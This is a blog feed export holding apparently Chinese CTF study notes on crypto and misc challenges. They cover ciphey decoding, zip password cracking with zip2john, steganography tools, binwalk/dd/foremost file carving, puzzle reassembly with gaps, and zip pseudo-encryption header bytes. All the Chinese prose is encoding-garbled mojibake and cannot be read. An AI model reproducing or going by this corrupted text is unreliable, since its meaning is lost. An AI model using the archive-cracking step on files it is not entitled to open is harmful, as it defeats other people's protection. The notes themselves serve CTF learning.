class="line">æ³¨æ„ä¸€å®šè¦åšå®Œä¿å­˜ä¸€æ¬¡å¿«ç…§ï¼Œé˜²æ­¢è‡ªæˆ‘ç‚¸è£‚ï¼Œé‡æ–°å¼€å§‹</span><br><span class="line">å»ºè®®é…ä¸‰ä¸ªæ‹ä¸€æ¬¡</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> äºŒè¿›åˆ¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç +æ‚é¡¹é¢˜ç®€å•è®°å½•</title>
      <link href="/2022/09/27/crypto+misc/"/>
      <url>/2022/09/27/crypto+misc/</url>
      
        <content type="html"><![CDATA[<p><code>åªä¼šwebï¼Œå¾—åˆ†å¤ªå°‘ï¼Œè¿˜æ˜¯æç‚¹å¯†ç å’Œæ‚é¡¹æ¥æé«˜ä¸€ä¸‹</code></p><span id="more"></span><h2 id="1-ä¸€èˆ¬åŠ å¯†"><a href="#1-ä¸€èˆ¬åŠ å¯†" class="headerlink" title="1.ä¸€èˆ¬åŠ å¯†"></a>1.ä¸€èˆ¬åŠ å¯†</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç›´æ¥ç”¨kaliçš„</span><br><span class="line"></span><br><span class="line">ciphey -<span class="built_in">t</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure><h2 id="2-SSTVå›¾åƒå£°éŸ³-x2F-Audacityæ³¢å½¢å£°éŸ³"><a href="#2-SSTVå›¾åƒå£°éŸ³-x2F-Audacityæ³¢å½¢å£°éŸ³" class="headerlink" title="2.SSTVå›¾åƒå£°éŸ³&#x2F;Audacityæ³¢å½¢å£°éŸ³"></a>2.SSTVå›¾åƒå£°éŸ³&#x2F;Audacityæ³¢å½¢å£°éŸ³</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç”¨wi<span class="symbol">n10</span>ä¸Š</span><br><span class="line"></span><br><span class="line">MMSSTVå·¥å…·è§£æå£°éŸ³ï¼Œæœ€å¥½ç”¨è™šæ‹Ÿå£°å¡è¿™æ ·å¯ä»¥å±è”½ä¸€äº›æ‚éŸ³ã€æŠŠå£°éŸ³ç»™MMSSTVå¬ã€‘</span><br><span class="line"></span><br><span class="line">Audacityè§£æå£°éŸ³æ³¢å½¢å¾—åˆ°æ³¢å½¢å›¾åƒä»è€Œå¾—åˆ°flag</span><br></pre></td></tr></table></figure><h2 id="3-åŠ å¯†å‹ç¼©åŒ…"><a href="#3-åŠ å¯†å‹ç¼©åŒ…" class="headerlink" title="3.åŠ å¯†å‹ç¼©åŒ…"></a>3.åŠ å¯†å‹ç¼©åŒ…</h2><h3 id="1ï¼‰win10"><a href="#1ï¼‰win10" class="headerlink" title="*1ï¼‰win10"></a>*1ï¼‰win10</h3><p>ç”¨<code>win10</code>å·¥å…·çˆ†ç ´å‹ç¼©åŒ…å¯†ç </p><h3 id="2ï¼‰kali"><a href="#2ï¼‰kali" class="headerlink" title="2ï¼‰kali"></a>2ï¼‰kali</h3><p><code>kali john</code>çˆ†ç ´å‹ç¼©åŒ…</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip2john å‹ç¼©åŒ…çš„åå­—<span class="string">.zip</span> &gt;&gt; passwdhash.txt</span><br></pre></td></tr></table></figure><h2 id="4-å›¾ç‰‡éšå†™"><a href="#4-å›¾ç‰‡éšå†™" class="headerlink" title="4.å›¾ç‰‡éšå†™"></a>4.å›¾ç‰‡éšå†™</h2><h3 id="1ï¼‰win10-1"><a href="#1ï¼‰win10-1" class="headerlink" title="1ï¼‰win10"></a>1ï¼‰win10</h3><p>åˆ©ç”¨<code>Stegsolve</code>è§£æå›¾ç‰‡éšå†™å†…å®¹</p><h3 id="2ï¼‰kali-1"><a href="#2ï¼‰kali-1" class="headerlink" title="*2ï¼‰kali"></a>*2ï¼‰kali</h3><p><code>zsteg</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">zsteg</span> å›¾ç‰‡</span><br></pre></td></tr></table></figure><h2 id="5-é›¶å®½å­—ç¬¦éšå†™"><a href="#5-é›¶å®½å­—ç¬¦éšå†™" class="headerlink" title="5.é›¶å®½å­—ç¬¦éšå†™"></a>5.é›¶å®½å­—ç¬¦éšå†™</h2><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p><p>æˆ‘ä»¬å¼€å§‹çœ‹è¿™ä¸ªå†…å®¹æ˜¯æ²¡æœ‰ä»€ä¹ˆé—®é¢˜çš„ï¼Œä½†æ˜¯åº•ä¸‹çš„</p><p><code>ç¬¬7è¡Œï¼Œç¬¬204åˆ—</code></p><p>è¯´æ˜é‡Œé¢æœ‰å…¶ä»–æˆ‘ä»¬æ— æ³•çœ‹åˆ°çš„å­—ç¬¦å­˜åœ¨</p><p><img src="/2022/09/27/crypto+misc/image-20220927160630959.png" alt="image-20220927160630959"></p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>vim</code>è¯»å–ä¸€ä¸‹è¿™ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå°±ä¼šå‘ç°é‡Œé¢å¤šäº†å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦</p><p><img src="/2022/09/27/crypto+misc/image-20220927160526722.png" alt="image-20220927160526722"></p><p>è¿™äº›å°±æ˜¯<code>é›¶å®½å­—ç¬¦</code></p><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ä»ä¸­è¯»å–ä¿¡æ¯å‘¢</p><p>è¿™é‡Œå°±éœ€è¦ä¸‹é¢è¿™ä¸ªç½‘ç«™çš„ï¼Œå¯¹æ–‡æœ¬çš„<code>é›¶å®½å­—ç¬¦åŠ å¯†</code>å’Œ<code>é›¶å®½å­—ç¬¦è§£å¯†</code>åŠŸèƒ½</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">330</span>k.github.io<span class="regexp">/misc_tools/u</span>nicode_steganography.html</span><br></pre></td></tr></table></figure><p>å…ˆé€‰å¥½å‡ºç°çš„å­—ç¬¦ç±»å‹</p><p><img src="/2022/09/27/crypto+misc/image-20220927161233239.png" alt="image-20220927161233239"></p><p>ç„¶å</p><p><img src="/2022/09/27/crypto+misc/image-20220927161257809.png" alt="image-20220927161257809"></p><p>å¾—åˆ°éšè—å†…å®¹</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">86</span>MygAZ<span class="number">2</span>uJi<span class="number">2</span>oCxctsd<span class="number">28</span>LB<span class="symbol">NRXHPLykF5</span>LBz<span class="number">8</span>f<span class="number">1</span>xEikW<span class="symbol">NVpKfpce2</span>CMHvhSJUdk<span class="number">7</span>CHLrEVhGRVQvMwT<span class="number">8</span>r<span class="number">7</span>JUgVWGb<span class="symbol">nzxb</span></span><br></pre></td></tr></table></figure><p>ç”¨<code>ciphey</code> å¾—åˆ°<code>flag</code></p><p><img src="/2022/09/27/crypto+misc/image-20220927161352763.png" alt="image-20220927161352763"></p><h2 id="6-éšè—ç§˜å¯†-flag-åˆ°å›¾ç‰‡ã€éŸ³ä¹"><a href="#6-éšè—ç§˜å¯†-flag-åˆ°å›¾ç‰‡ã€éŸ³ä¹" class="headerlink" title="6.éšè—ç§˜å¯†(flag)åˆ°å›¾ç‰‡ã€éŸ³ä¹"></a>6.éšè—ç§˜å¯†(flag)åˆ°å›¾ç‰‡ã€éŸ³ä¹</h2><h3 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h3><p><code>Silenteye</code></p><p><img src="/2022/09/27/crypto+misc/image-20220927162235740.png" alt="image-20220927162235740"></p><p>æŠŠå›¾ç‰‡æˆ–è€…å£°éŸ³æ‹–å…¥å…¶ä¸­</p><p><img src="/2022/09/27/crypto+misc/image-20220927162311232.png" alt="image-20220927162311232"></p><p>ç„¶åæ‰§è¡Œ<code>Decode</code></p><p><img src="/2022/09/27/crypto+misc/image-20220927162351939.png" alt="image-20220927162351939"></p><p>å¾—åˆ°åŠ å¯†ä¿¡æ¯</p><p>ç”¨<code>ciphey</code> å¾—åˆ°<code>flag</code></p><p><img src="/2022/09/27/crypto+misc/image-20220927162441904.png" alt="image-20220927162441904"></p><h2 id="7-å°æ¸¸æˆ"><a href="#7-å°æ¸¸æˆ" class="headerlink" title="7.å°æ¸¸æˆ"></a>7.å°æ¸¸æˆ</h2><h3 id="win10-1"><a href="#win10-1" class="headerlink" title="win10"></a>win10</h3><p><code>CEä¿®æ”¹å™¨ï¼Œæ‡‚å¾—éƒ½æ‡‚</code></p><h2 id="8-Javaç±»çš„"><a href="#8-Javaç±»çš„" class="headerlink" title="8.Javaç±»çš„"></a>8.Javaç±»çš„</h2><p>åˆ©ç”¨<code>jd-gui</code>å¯¹javaåæ±‡ç¼–ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä¿¡æ¯</p><h2 id="9-äºŒç»´ç "><a href="#9-äºŒç»´ç " class="headerlink" title="9.äºŒç»´ç "></a>9.äºŒç»´ç </h2><h3 id="1ï¼‰ç¼ºå°‘å®šä½ç‚¹"><a href="#1ï¼‰ç¼ºå°‘å®šä½ç‚¹" class="headerlink" title="1ï¼‰ç¼ºå°‘å®šä½ç‚¹"></a>1ï¼‰ç¼ºå°‘å®šä½ç‚¹</h3><p><img src="/2022/09/27/crypto+misc/image-20220927163933448.png" alt="image-20220927163933448"></p><p>åˆ©ç”¨<code>ps</code>æŠŠä¸¤è€…æ‹¼æ¥èµ·æ¥å°±å¯ä»¥äº†</p><h2 id="10-åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶"><a href="#10-åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶" class="headerlink" title="10.åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶"></a>10.åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶</h2><p><a href="https://blog.csdn.net/qq_43531669/article/details/113732757">åŸæ–‡é“¾æ¥</a></p><h3 id="1ï¼‰å›¾ç‰‡åˆ†æ"><a href="#1ï¼‰å›¾ç‰‡åˆ†æ" class="headerlink" title="1ï¼‰å›¾ç‰‡åˆ†æ:"></a>1ï¼‰å›¾ç‰‡åˆ†æ:</h3><p>å¦‚å›¾ä¸ºCTFé¢˜ç›®ä¸­ä¸€ä¸ªéšè—æ–‡ä»¶çš„å›¾ç‰‡</p><p>é¦–å…ˆå¯¹å›¾ç‰‡è¿›è¡Œåˆ†æï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸ªå·¥å…·binwalkï¼ˆkaliä¸­æ˜¯è‡ªå¸¦çš„ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½åˆ°windowsä¸­ä½¿ç”¨ï¼‰ã€‚</p><p>ä½¿ç”¨æ–¹æ³•ï¼šbinwalk + æ–‡ä»¶è·¯å¾„&#x2F;æ–‡ä»¶å</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">binwalk</span> <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤åï¼Œbinwalkå°±ä¼šè‡ªåŠ¨åˆ†æè¿™ä¸ªjpgæ–‡ä»¶ï¼š</p><p><img src="/2022/09/27/crypto+misc/image-20220927165710470.png" alt="image-20220927165710470"></p><p>ä»åˆ†æçš„ç»“æœçœ‹ï¼Œè¿™ä¸ªjpgæ–‡ä»¶éšè—ç€ä¸€ä¸ªzipæ–‡ä»¶ï¼Œä»48221å—åç§»å¼€å§‹å°±æ˜¯zipæ–‡ä»¶ã€‚</p><h3 id="2ã€å¦‚ä½•åˆ†ç¦»ï¼š"><a href="#2ã€å¦‚ä½•åˆ†ç¦»ï¼š" class="headerlink" title="2ã€å¦‚ä½•åˆ†ç¦»ï¼š"></a>2ã€å¦‚ä½•åˆ†ç¦»ï¼š</h3><p>åœ¨å¾—åˆ°éšè—ä¿¡æ¯åï¼Œæ”¹å¦‚ä½•æŠŠzipæ–‡ä»¶åˆ†ç¦»å‡ºï¼Œä¸‹é¢ä»‹ç»å‡ ç§æ–¹æ³•ï¼š</p><h4 id="2-1ã€binwalk-åˆ†ç¦»ï¼š"><a href="#2-1ã€binwalk-åˆ†ç¦»ï¼š" class="headerlink" title="2.1ã€binwalk åˆ†ç¦»ï¼š"></a>2.1ã€binwalk åˆ†ç¦»ï¼š</h4><p>è¿˜æ˜¯ä½¿ç”¨binwalkå·¥å…·ï¼Œä½¿ç”¨ddå‘½ä»¤åˆ†ç¦»å‡ºéšè—æ–‡ä»¶ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="attribute">if</span>=1.jpg <span class="attribute">of</span>=1.zip <span class="attribute">skip</span>=48221 <span class="attribute">bs</span>=1</span><br></pre></td></tr></table></figure><p>è§£é‡Šï¼šif æŒ‡å®šè¾“å…¥æ–‡ä»¶ï¼Œof æŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼Œskip æŒ‡å®šä»è¾“å…¥æ–‡ä»¶å¼€å¤´è·³è¿‡48221ä¸ªå—åå¼€å§‹å¤åˆ¶ï¼Œ</p><p>bsè®¾ç½®æ¯æ¬¡è¯»å†™å—çš„å¤§å°ä¸º1å­—èŠ‚</p><p>æ‰§è¡Œåä¼šå¾—åˆ°ä¸€ä¸ª1.zipæ–‡ä»¶ã€‚</p><p><img src="/2022/09/27/crypto+misc/image-20220927165740304.png" alt="image-20220927165740304"></p><h4 id="2-2ã€foremost-å·¥å…·åˆ†ç¦»ï¼š"><a href="#2-2ã€foremost-å·¥å…·åˆ†ç¦»ï¼š" class="headerlink" title="2.2ã€foremost å·¥å…·åˆ†ç¦»ï¼š"></a>2.2ã€foremost å·¥å…·åˆ†ç¦»ï¼š</h4><p>foremostæ˜¯ä¸€ä¸ªåŸºäºæ–‡ä»¶æ–‡ä»¶å¤´å’Œå°¾éƒ¨ä¿¡æ¯ä»¥åŠæ–‡ä»¶çš„å†…å»ºæ•°æ®ç»“æ„æ¢å¤æ–‡ä»¶çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œwinå¯ä»¥ä¸‹è½½ä½¿ç”¨ï¼ŒLinuxå¯ä»¥é€šè¿‡ä¸‹é¢å‘½ä»¤å®‰è£…ä½¿ç”¨ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install foremost</span><br></pre></td></tr></table></figure><p>Linuxä¸‹åˆ†ç¦»æ–‡ä»¶çš„å‘½ä»¤ä¸ºï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">foremost</span> <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤åï¼Œforemostä¼šç”Ÿæˆoutputç›®å½•å­˜æ”¾åˆ†ç¦»å‡ºçš„æ–‡ä»¶ã€‚</p><p>Winä¸‹æ˜¯æŠŠæ–‡ä»¶ç›´æ¥æ‹–åˆ° foremost.exeä¸Šï¼Œä¹Ÿä¼šç”Ÿæˆoutputç›®å½•å­˜æ”¾åˆ†ç¦»å‡ºçš„æ–‡ä»¶ã€‚</p><p><img src="/2022/09/27/crypto+misc/image-20220927165802749.png" alt="image-20220927165802749"></p><h4 id="2-3ã€hexç¼–è¾‘å™¨åˆ†ç¦»ï¼š"><a href="#2-3ã€hexç¼–è¾‘å™¨åˆ†ç¦»ï¼š" class="headerlink" title="2.3ã€hexç¼–è¾‘å™¨åˆ†ç¦»ï¼š"></a>2.3ã€hexç¼–è¾‘å™¨åˆ†ç¦»ï¼š</h4><p>hexç¼–è¾‘å™¨æœ‰å¾ˆå¤šï¼Œwinä¸‹æœ‰ç”¨å¾—è¾ƒå¤šçš„winhexã€UltraEditç­‰ï¼Œlinuxä¸‹æœ‰hexeditorç­‰ã€‚è¿™é‡Œæˆ‘ä»¬ä»¥winhexä¸ºä¾‹æ¥æ‰‹åŠ¨åˆ†ç¦»ã€‚</p><p>ä¸€ä¸ªå®Œæ•´çš„ jpg æ–‡ä»¶ç”± FF D8 å¼€å¤´ï¼ŒFF D9ç»“å°¾ï¼Œå›¾ç‰‡æŸ¥çœ‹å™¨ä¼šå¿½ç•¥ FF D9 ä»¥åçš„å†…å®¹ï¼Œå› æ­¤å¯ä»¥åœ¨ jpg æ–‡ä»¶ä¸­åŠ å…¥å…¶ä»–æ–‡ä»¶ã€‚</p><p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œ çŸ¥é“å›¾ç‰‡ä¸­éšè—äº†zipæ–‡ä»¶ï¼Œzipæ–‡ä»¶çš„å¼€å¤´16è¿›åˆ¶ä¸º504B0304ï¼Œå…ˆæœç´¢16è¿›åˆ¶æ–‡æœ¬ FFD9ï¼Œç„¶ååé¢è·Ÿç€504B0304ï¼Œäºæ˜¯å°±å¯ä»¥ä» 50 å¼€å§‹ï¼Œå¤åˆ¶åˆ°æœ€åï¼ˆå› ä¸ºè¿™é‡Œåªæœ‰ä¸€ä¸ªzipï¼Œæ‰€ä»¥å¤åˆ¶åˆ°æœ€åï¼‰ï¼Œå¦å­˜ä¸ºæ–°æ–‡ä»¶ï¼Œå°±å¾—åˆ°äº†éšè—çš„å‹ç¼©åŒ…ã€‚</p><p><img src="/2022/09/27/crypto+misc/image-20220927165829838.png" alt="image-20220927165829838"></p><p><img src="/2022/09/27/crypto+misc/image-20220927165845340.png" alt="image-20220927165845340"></p><p><img src="/2022/09/27/crypto+misc/image-20220927165911140.png" alt="image-20220927165911140"></p><h4 id="2-4ã€æ”¹åç¼€åï¼š"><a href="#2-4ã€æ”¹åç¼€åï¼š" class="headerlink" title="2.4ã€æ”¹åç¼€åï¼š"></a>2.4ã€æ”¹åç¼€åï¼š</h4><p>åˆ†æçŸ¥é“éšè—æ–‡ä»¶æ˜¯zipåï¼Œæœ‰ä¸€ä¸ªç®€å•ç²—æš´çš„æ–¹æ³•æ˜¯ç›´æ¥æŠŠå›¾ç‰‡çš„åç¼€æ”¹ä¸º.zipï¼Œç„¶åè§£å‹å³å¯ï¼ˆè¿™ç§æ–¹æ³•è™½ç„¶ç®€å•å¿«é€Ÿï¼Œä½†å¦‚æœéšå†™äº†å¤šä¸ªæ–‡ä»¶æ—¶å¯èƒ½ä¼šå¤±è´¥ï¼‰ã€‚</p><h2 id="11-å¤šå›¾ç‰‡æ‹¼å›¾"><a href="#11-å¤šå›¾ç‰‡æ‹¼å›¾" class="headerlink" title="11.å¤šå›¾ç‰‡æ‹¼å›¾"></a>11.å¤šå›¾ç‰‡æ‹¼å›¾</h2><p><a href="https://blog.csdn.net/m0_62291930/article/details/124139016">åŸæ–‡é“¾æ¥</a></p><p>Misc è‡ªåŠ¨æ‹¼å›¾<br>éœ€è¦ä½¿ç”¨<code>python</code>é—ä¼ ç®—æ³•è„šæœ¬<code>gaps</code>å’Œæ‹¼å›¾è„šæœ¬<code>montage</code></p><p>å¼€å§‹æ‹¼å›¾<br>ä»¥ctfä¸­çš„ä¸€é“è®­ç»ƒé¢˜puzzleä¸ºä¾‹</p><p>å¦‚æœå›¾ç‰‡ä¸ºç¢ç‰‡çŠ¶ï¼Œæ ¹æ®æ€»æ•°ç¡®å®šæ‹¼å—é•¿å®½æ•°é‡ï¼Œå¹¶ç”¨montageè¿›è¡Œç¬¬ä¸€æ¬¡æ‹¼æ¥</p><p><img src="/2022/09/27/crypto+misc/image-20220927171241532.png" alt="image-20220927171241532"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#å¦‚å·¦ä¸‹è§’æ‰€ç¤ºï¼Œæ€»æ•°ä¸º256å—ï¼Œå³å›¾ç‰‡ä»¥16Ã—16æ‹†åˆ†è€Œæˆçš„ï¼ˆè¦åœ¨æ‹¼å—ç›®å½•ä¸‹è¿è¡Œå‘½ä»¤ï¼‰ï¼Œ</span></span><br><span class="line"><span class="meta">#*.pngä¸ºæ‹¼å—æ ¼å¼ï¼Œ16Ã—16ä¸ºé•¿å®½æ•°é‡ï¼Œflag.pngä¸ºåˆæˆåçš„å›¾ç‰‡å</span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">montage</span> *.png -tile <span class="number">16</span>x16 -geometry +<span class="number">0</span>+<span class="number">0</span> flag.png   </span><br></pre></td></tr></table></figure><p>è¿è¡Œååœ¨ç›®å½•ä¸‹å¯æ‰¾åˆ°å¦‚ä¸‹å›¾ç‰‡</p><p><img src="/2022/09/27/crypto+misc/image-20220927171709538.png" alt="image-20220927171709538"></p><p>è¿è¡Œååœ¨ç›®å½•ä¸‹å¯æ‰¾åˆ°å¦‚ä¸‹å›¾ç‰‡</p><p><strong>æ¥ç€æœ€å…³é”®çš„ä¸€ç‚¹ï¼Œè°ƒæ•´å›¾ç‰‡é•¿å®½æ¯”ä¸º1ï¼š1ï¼Œå¯ä»¥ç”¨PS-&gt;å›¾åƒå¤§å°ï¼Œä»¥è¾ƒå¤§æ•°å€¼ä¸ºè¾¹é•¿ï¼Œæ‰©å……ä¸ºæ­£æ–¹å½¢ï¼ˆæ–¹ä¾¿åç»­sizeçš„è®¡ç®—ï¼‰ï¼Œå¦åˆ™åæœŸgapsæ— æ³•è·å¾—æœ€ä½³æ•ˆæœ</strong></p><p><img src="/2022/09/27/crypto+misc/image-20220927171907186.png" alt="image-20220927171907186"></p><p><img src="/2022/09/27/crypto+misc/image-20220927171924733.png" alt="image-20220927171924733"></p><p>æ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨gapsè„šæœ¬å®ç°è‡ªåŠ¨æ‹¼å›¾æ’åº<strong>ï¼ˆé‡ç‚¹ï¼‰</strong></p><p><img src="/2022/09/27/crypto+misc/image-20220927171940838.png" alt="image-20220927171940838"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ­¤å¤„çš„sizeä¸ºæ­£æ–¹å½¢å°æ‹¼å—çš„è¾¹é•¿åƒç´ ï¼Œç”±äºåˆšåˆšç»è¿‡æ‹‰ä¼¸ï¼Œæ‹¼å—ä»160Ã—100å˜æˆäº†160Ã—160</span></span><br><span class="line"><span class="comment">#æ³¨æ„æ˜¯å°çš„æ­£æ–¹å½¢åƒç´ ï¼Œæ¯”å¦‚æ‹¼æ¥å®Œæˆçš„ä¸º360pxï¼Œè€Œä¸€åˆ—æœ‰12å¼ å›¾ï¼Œé‚£sizeä¸º12px</span></span><br><span class="line">gaps <span class="attribute">--image</span>=flag.png <span class="attribute">--size</span>=160 --save     </span><br></pre></td></tr></table></figure><p><img src="/2022/09/27/crypto+misc/image-20220927171957840.png" alt="image-20220927171957840"></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">è¡¥å……ï¼šgapså„å‚æ•°çš„ä½œç”¨</span><br><span class="line"></span><br><span class="line">â€“<span class="built_in">image</span> æŒ‡å‘æ‹¼å›¾çš„è·¯å¾„</span><br><span class="line">â€“size æ‹¼å›¾å—çš„åƒç´ å°ºå¯¸</span><br><span class="line">â€“generations é—ä¼ ç®—æ³•çš„ä»£çš„æ•°é‡</span><br><span class="line">â€“population ä¸ªä½“æ•°é‡</span><br><span class="line">â€“<span class="built_in">verbose</span> æ¯ä¸€ä»£è®­ç»ƒç»“æŸåå±•ç¤ºæœ€ä½³ç»“æœ</span><br><span class="line">â€“<span class="built_in">save</span> å°†æ‹¼å›¾è¿˜åŸä¸ºå›¾åƒ</span><br></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ€»ç»“</span><br><span class="line">æœ€æœ‰æŒ‘æˆ˜æ€§çš„åœ°æ–¹è«è¿‡äºå®‰è£…gapså’Œå¯¹gapså‚æ•°çš„æŠŠæ¡ï¼Œç‰¹åˆ«æ˜¯sizedçš„è®¡ç®—,éœ€è¦å…ˆä½¿å›¾ç‰‡çš„æ‹¼å—æ°å¥½ä¸ºåƒç´ æœ€å¤§çš„ä¸€æ¡è¾¹çš„æ­£æ–¹å½¢ï¼Œ<span class="keyword">size</span>=è¯¥è¾¹é•¿åƒç´ ã€‚å¦å¤–ï¼Œpipå’Œ<span class="keyword">python</span>åº“è¦æå‰å®‰è£…å®Œæ¯•</span><br></pre></td></tr></table></figure><h2 id="12-zipä¼ªåŠ å¯†ã€360å‹ç¼©æ— è§†ä¼ªåŠ å¯†ã€‘"><a href="#12-zipä¼ªåŠ å¯†ã€360å‹ç¼©æ— è§†ä¼ªåŠ å¯†ã€‘" class="headerlink" title="12.zipä¼ªåŠ å¯†ã€360å‹ç¼©æ— è§†ä¼ªåŠ å¯†ã€‘"></a>12.zipä¼ªåŠ å¯†ã€360å‹ç¼©æ— è§†ä¼ªåŠ å¯†ã€‘</h2><h3 id="1-zip-æ–‡ä»¶"><a href="#1-zip-æ–‡ä»¶" class="headerlink" title="1)zip æ–‡ä»¶"></a>1)zip æ–‡ä»¶</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¸€ä¸ª <span class="keyword">ZIP</span> æ–‡ä»¶ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š</span><br><span class="line"></span><br><span class="line">å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—</span><br></pre></td></tr></table></figure><h3 id="2-ä¼ªåŠ å¯†åŸç†"><a href="#2-ä¼ªåŠ å¯†åŸç†" class="headerlink" title="2)ä¼ªåŠ å¯†åŸç†"></a>2)ä¼ªåŠ å¯†åŸç†</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zipä¼ªåŠ å¯†æ˜¯åœ¨æ–‡ä»¶å¤´çš„åŠ å¯†æ ‡å¿—ä½åšä¿®æ”¹ï¼Œè¿›è€Œå†æ‰“å¼€æ–‡ä»¶æ—¶è¯†è¢«åˆ«ä¸ºåŠ å¯†å‹ç¼©åŒ…ã€‚</span><br><span class="line"></span><br><span class="line">æŠŠ å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº çš„ å…¨å±€æ–¹å¼ä½æ ‡è®°  çš„ `01 <span class="number">00</span>` æˆ– `09 <span class="number">00</span>` æ”¹ä¸º `00 <span class="number">00</span>`  å°±å¯ä»¥å»é™¤å¯†ç </span><br><span class="line"></span><br><span class="line">æŠŠ å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº çš„ å…¨å±€æ–¹å¼ä½æ ‡è®°  çš„ `00 <span class="number">00</span>` æ”¹ä¸º  `01 <span class="number">00</span>` æˆ– `09 <span class="number">00</span>`  å°±å¯ä»¥æ·»åŠ å¯†ç  æç¤º</span><br></pre></td></tr></table></figure><h3 id="3-å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº"><a href="#3-å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº" class="headerlink" title="3)å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº"></a>3)å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">50</span> <span class="number">4</span>B <span class="number">03</span> <span class="number">04</span>ï¼šè¿™æ˜¯å¤´æ–‡ä»¶æ ‡è®°ï¼ˆ<span class="number">0</span>x04034b50ï¼‰ </span><br><span class="line"><span class="attribute">14</span> <span class="number">00</span>ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬ </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼‰ </span><br><span class="line"><span class="attribute">08</span> <span class="number">00</span>ï¼šå‹ç¼©æ–¹å¼ </span><br><span class="line"><span class="attribute">5A</span> <span 